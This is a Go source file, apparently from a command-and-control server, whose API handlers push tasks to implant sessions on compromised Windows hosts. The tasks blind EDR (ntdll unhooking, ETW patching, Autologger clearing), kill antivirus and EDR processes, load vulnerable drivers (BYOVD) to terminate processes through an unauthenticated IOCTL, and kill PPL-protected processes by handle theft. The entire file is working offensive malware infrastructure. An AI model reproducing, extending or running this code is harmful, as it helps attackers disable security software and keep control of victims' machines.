package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/drivers"
	"toshell/internal/server/logging"
)

// parseIOCTLValue 解析 IOCTL：兼容 "0x222048"（十六进制字符串）、"2236488"（十进制字符串）
// 与 2236488（数字）。非法/空值返回 0。
func parseIOCTLValue(v interface{}) uint32 {
	switch t := v.(type) {
	case float64:
		return uint32(t)
	case string:
		s := strings.TrimSpace(t)
		if s == "" {
			return 0
		}
		if n, err := strconv.ParseUint(strings.TrimPrefix(strings.ToLower(s), "0x"), 16, 32); err == nil {
			return uint32(n)
		}
		if n, err := strconv.ParseUint(s, 10, 32); err == nil {
			return uint32(n)
		}
	}
	return 0
}

// rememberSessionDriver 登记"本会话已加载的驱动档案"，供 byovd_kill 复用。
func (s *Server) rememberSessionDriver(sessionID string, d drivers.Driver) {
	if sessionID == "" {
		return
	}
	s.driverMu.Lock()
	defer s.driverMu.Unlock()
	if s.sessionDrivers == nil {
		s.sessionDrivers = map[string]drivers.Driver{}
	}
	s.sessionDrivers[sessionID] = d
}

// recallSessionDriver 取回本会话登记的驱动档案。
func (s *Server) recallSessionDriver(sessionID string) (drivers.Driver, bool) {
	s.driverMu.Lock()
	defer s.driverMu.Unlock()
	d, ok := s.sessionDrivers[sessionID]
	return d, ok
}

// edrBlindHandler 下发 EDR 失明任务（ntdll 脱钩 + ETW patch + Autologger 清理）。
func (s *Server) edrBlindHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateEDRBlind(id)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "edr_blind pushed to session %s", id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "EDR blind task pushed",
	})
}

// edrKillHandler 下发 EDR 击杀任务；processes 为空时使用植入端默认杀软进程列表。
func (s *Server) edrKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateEDRKill(id, req.Processes)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "edr_kill (%d procs) pushed to session %s", len(req.Processes), id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"count":     len(req.Processes),
		"message":   "EDR kill task pushed",
	})
}

// byovdKillHandler 下发 BYOVD 驱动击杀任务：按 PID 或进程名调用**操作员提供的**
// 驱动的无鉴权进程终止 IOCTL（服务端不再内置任何驱动，因此设备名与 IOCTL 必须由
// 请求指定，或来自此前 byovd_load 时登记/驱动目录 manifest 声明的档案）。
//
// 请求体：{ "pid": 1234 } 或 { "process_name": "360tray.exe" }，
// 可选 { "device": "\\\\.\\yourdrv", "ioctl": "0x222048" } 或 { "driver": "yourdrv" }。
// 该路线对 PPL 保护进程无效（内核句柄检查拦得住），PPL 请用 ppl_kill 的句柄窃取路线。
func (s *Server) byovdKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		PID         uint32      `json:"pid"`
		ProcessName string      `json:"process_name"`
		Driver      string      `json:"driver"`
		Device      string      `json:"device"`
		IOCTL       interface{} `json:"ioctl"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.PID == 0 && req.ProcessName == "" {
		http.Error(w, `{"error":"pid 或 process_name 至少提供一个"}`, http.StatusBadRequest)
		return
	}

	// 驱动档案解析优先级：请求显式指定 → 本会话 byovd_load 登记的档案 → 驱动目录 manifest
	device := strings.TrimSpace(req.Device)
	ioctl := parseIOCTLValue(req.IOCTL)
	driverName := ""
	if d, ok := s.recallSessionDriver(id); ok {
		if device == "" {
			device = d.Device
		}
		if ioctl == 0 {
			ioctl = d.IOCTL
		}
		driverName = d.Name
	}
	if req.Driver != "" {
		d, _, err := drivers.Get(req.Driver)
		if err != nil {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusBadRequest)
			return
		}
		device, ioctl, driverName = d.Device, d.IOCTL, d.Name
	}
	if (device == "" || ioctl == 0) && driverName == "" {
		if d, ok := drivers.KillProfile(); ok {
			device, ioctl, driverName = d.Device, d.IOCTL, d.Name
		}
	}
	if device == "" || ioctl == 0 {
		http.Error(w, `{"error":"未指定驱动的设备名与终止 IOCTL：请先在第 1 步加载你的 .sys（填写设备名/服务名/终止 IOCTL），或在请求里带上 device 与 ioctl；服务端不再内置任何驱动"}`, http.StatusBadRequest)
		return
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateBYOVDKill(id, req.PID, req.ProcessName, device, ioctl)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	target := req.ProcessName
	if target == "" {
		target = fmt.Sprintf("pid=%d", req.PID)
	}
	logging.Info("api", "byovd_kill (%s) pushed to session %s (driver=%s device=%s ioctl=0x%X)",
		target, id, driverName, device, ioctl)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"driver":    driverName,
		"device":    device,
		"ioctl":     ioctl,
		"message":   "BYOVD kill task pushed",
	})
}

// byovdLoadHandler 下发 BYOVD 驱动加载任务（driver_b64 + service_name + device_name），
// 可选 kill_ioctl/purpose/description：填了就在服务端登记该驱动档案，
// 供后续 byovd_kill 直接复用（避免每次都手填设备名与 IOCTL）。
func (s *Server) byovdLoadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		DriverB64   string      `json:"driver_b64"`
		ServiceName string      `json:"service_name"`
		DeviceName  string      `json:"device_name"`
		KillIOCTL   interface{} `json:"kill_ioctl"`
		Name        string      `json:"name"`
		Description string      `json:"description"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.DriverB64 == "" {
		http.Error(w, `{"error":"driver_b64 is required"}`, http.StatusBadRequest)
		return
	}
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	// —— 加载前自检（ROADMAP P0-1）——
	// 有 Errors（典型场景：上传的 .sys 与 manifest 声明的 sha256 不一致，说明被替换/损坏）→ 拒绝下发；
	// 有 Warnings（未签名、本机易受攻击驱动黑名单可能拦截等）→ 允许下发，但回传警告并记日志。
	// 说明：WinVerifyTrust 只能校验磁盘文件，因此上传内容靠 manifest 的期望 sha256 做硬校验，
	// 签名结论则在服务端存在同名同哈希驱动时复用（详见 drivers.VerifyBytes 注释）。
	var verify *drivers.VerifyResult
	if raw, decErr := base64.StdEncoding.DecodeString(strings.TrimSpace(req.DriverB64)); decErr != nil {
		logging.Warn("api", "byovd_load 自检跳过：driver_b64 解码失败（%v）", decErr)
	} else {
		res := drivers.VerifyBytes(req.Name, raw)
		verify = &res
	}
	if verify != nil && len(verify.Errors) > 0 {
		logging.Warn("api", "byovd_load 自检未通过，拒绝下发（driver=%q）：%s", req.Name, strings.Join(verify.Errors, "；"))
		body, _ := json.Marshal(map[string]interface{}{
			"error":    "驱动自检未通过，已拒绝下发：" + strings.Join(verify.Errors, "；"),
			"verify":   verify,
			"warnings": verify.Warnings,
		})
		w.WriteHeader(http.StatusBadRequest)
		w.Write(body)
		return
	}
	if verify != nil && len(verify.Warnings) > 0 {
		logging.Warn("api", "byovd_load 自检警告（driver=%q）：%s", req.Name, strings.Join(verify.Warnings, "；"))
	}

	// 登记驱动档案（设备名统一补上 \\.\ 前缀，便于后续击杀直接使用）
	ioctl := parseIOCTLValue(req.KillIOCTL)
	if ioctl != 0 || req.DeviceName != "" {
		dev := strings.TrimSpace(req.DeviceName)
		if dev != "" && !strings.HasPrefix(dev, `\\`) {
			dev = `\\.\` + strings.TrimPrefix(dev, `\`)
		}
		s.rememberSessionDriver(id, drivers.Driver{
			Name: req.Name, Service: req.ServiceName, Device: dev,
			IOCTL: ioctl, KillPIDSize: 4, Description: req.Description, Purpose: "kill",
		})
		logging.Info("api", "登记驱动档案 for session %s: device=%s ioctl=0x%X", id, dev, ioctl)
	}

	taskInfo, err := s.taskMgr.CreateBYOVDLoad(id, req.DriverB64, req.ServiceName, req.DeviceName)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	resp := map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "BYOVD load task pushed",
	}
	if verify != nil {
		resp["verify"] = verify
		resp["warnings"] = verify.Warnings
		resp["selfcheck"] = verify.Summary()
	}
	json.NewEncoder(w).Encode(resp)
}

// byovdUnloadHandler 下发 BYOVD 驱动卸载任务。
func (s *Server) byovdUnloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		ServiceName string `json:"service_name"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateBYOVDUnload(id, req.ServiceName)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "BYOVD unload task pushed",
	})
}

// pplKillHandler 下发 PPL 击杀任务。
func (s *Server) pplKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreatePPLKill(id, req.Processes)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "PPL kill task pushed",
	})
}
